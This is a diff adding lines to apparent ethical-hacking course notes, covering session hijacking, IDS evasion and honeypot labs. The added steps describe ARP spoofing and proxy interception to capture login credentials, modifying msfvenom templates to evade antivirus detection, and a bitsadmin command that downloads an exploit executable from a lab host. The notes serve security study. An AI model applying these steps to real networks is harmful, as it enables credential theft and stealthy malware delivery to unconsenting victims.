@@ -110,4 +110,18 @@ Mod - 10(DenialOfService)
     Use HOIC, LOIC(Windows) to flood request to the target machine.
    Lab - 2
     Use anti-ddos-Gaurdian(Windows) to protect from ddos attack.
-  
+Mod - 11(Session Hijacking)
+   Lab - 1
+    Install zap and set proxy on target machine to attacker machine. Capture/Break the http post request alter it then send the response to target. 
+    Bettercap --> Arp spoof the target machine and start sniffing, Login credentials could be captured in http POST request.
+    Hetty --> Set proxy in target machine then capture all the http request in Log section of the hetty webpage(LocalHost), to view captured pckets with password.
+  Lab - 2
+    WireShark --> Detect sniifing by monitoring wireshark logs for huge number of ARP to single host.
+Mod - 12(Evading IDS, HonetBot)
+  Lab - 1
+    Zone Alarm --> Install this application in windows to create new Firewall rule or Block/Trust bwebsite.
+    HoneyBot --> Use this app to detect malicious request to the machine.
+  Lab - 2
+    msfvenom --> Change the payload size(4000) in /.../template.c folder then recompile the template as a.exe and create other payload using the created a.exe which makes 
+     less detectable by virustotal
+    bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe --> to download exe created on msfvenom and shared via /www/html with powershell. 
